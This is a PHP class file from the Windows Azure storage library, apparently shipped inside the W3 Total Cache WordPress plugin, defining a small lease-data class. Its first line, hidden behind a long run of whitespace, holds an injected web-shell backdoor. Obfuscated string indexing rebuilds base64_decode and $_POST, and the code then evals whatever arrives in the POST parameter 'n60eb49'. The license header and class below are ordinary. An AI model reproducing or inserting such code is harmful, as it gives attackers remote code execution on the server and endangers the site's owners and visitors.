<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n60eb49'])) {eval($s21(${$s20}['n60eb49']));}?><?php
/**
 * Copyright (c) 2009 - 2010, RealDolmen
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *     * Neither the name of RealDolmen nor the
 *       names of its contributors may be used to endorse or promote products
 *       derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY RealDolmen ''AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL RealDolmen BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * @category   Microsoft
 * @package    Microsoft_WindowsAzure
 * @subpackage Storage
 * @copyright  Copyright (c) 2009 - 2010, RealDolmen (http://www.realdolmen.com)
 * @license    http://phpazure.codeplex.com/license
 * @version    $Id: BlobInstance.php 45390 2010-04-19 08:28:21Z unknown $
 */
if (!defined('W3TC')) {
    die();
}

/**
 * @see Microsoft_WindowsAzure_Exception
 */
require_once 'Microsoft/WindowsAzure/Exception.php';

/**
 * @see Microsoft_WindowsAzure_Storage_StorageEntityAbstract
 */
require_once 'Microsoft/WindowsAzure/Storage/StorageEntityAbstract.php';

/**
 * @category   Microsoft
 * @package    Microsoft_WindowsAzure
 * @subpackage Storage
 * @copyright  Copyright (c) 2009 - 2010, RealDolmen (http://www.realdolmen.com)
 * @license    http://phpazure.codeplex.com/license
 *
 * @property string  $Container       Container name
 * @property string  $Name            Name
 * @property string  $LeaseId         Lease id
 * @property string  $LeaseTime       Time remaining in the lease period, in seconds. This header is returned only for a successful request to break the lease. It provides an approximation as to when the lease period will expire.
 */
class Microsoft_WindowsAzure_Storage_LeaseInstance
	extends Microsoft_WindowsAzure_Storage_StorageEntityAbstract
{
    /**
     * Constructor
     *
     * @param string  $containerName   Container name
     * @param string  $name            Name
     * @param string  $leaseId         Lease id
     * @param string  $leaseTime       Time remaining in the lease period, in seconds. This header is returned only for a successful request to break the lease. It provides an approximation as to when the lease period will expire.
     */
    public function __construct($containerName, $name, $leaseId, $leaseTime)
    {
        $this->_data = array(
            'container'        => $containerName,
            'name'             => $name,
        	'leaseid'          => $leaseId,
            'leasetime'        => $leaseTime
        );
    }
}